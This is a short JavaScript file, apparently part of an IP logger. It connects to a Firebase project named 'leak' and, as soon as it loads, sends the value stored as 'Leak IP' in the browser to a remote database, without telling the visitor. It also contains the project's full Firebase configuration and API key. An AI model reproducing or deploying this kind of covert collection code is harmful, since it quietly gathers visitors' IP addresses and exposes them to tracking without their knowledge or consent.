import { initializeApp } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-database.js"
// import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-auth.js"


const firebaseConfig = {
    apiKey: "AIzaSyBqrfonDxVw-mXPzDCCdqiyNAgy9CWSzII",
    authDomain: "leak-55945.firebaseapp.com",
    databaseURL: "https://leak-55945-default-rtdb.firebaseio.com",
    projectId: "leak-55945",
    storageBucket: "leak-55945.appspot.com",
    messagingSenderId: "274502970342",
    appId: "1:274502970342:web:840cea9fcab0d916494427"
};

const app = initializeApp(firebaseConfig);
const dbRef = ref(getDatabase(app));
// const auth = getAuth();
let ip = localStorage.getItem("Leak IP")

function writeUserData(ip) {
    const db = getDatabase();
    set(ref(db, 'IP/' + String(Math.floor(Math.random() * 10000))), {
        ip: ip
    });
}

writeUserData(ip)